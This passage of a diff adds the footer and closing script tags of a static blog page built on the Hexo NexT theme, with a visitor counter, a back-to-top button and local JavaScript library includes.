+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
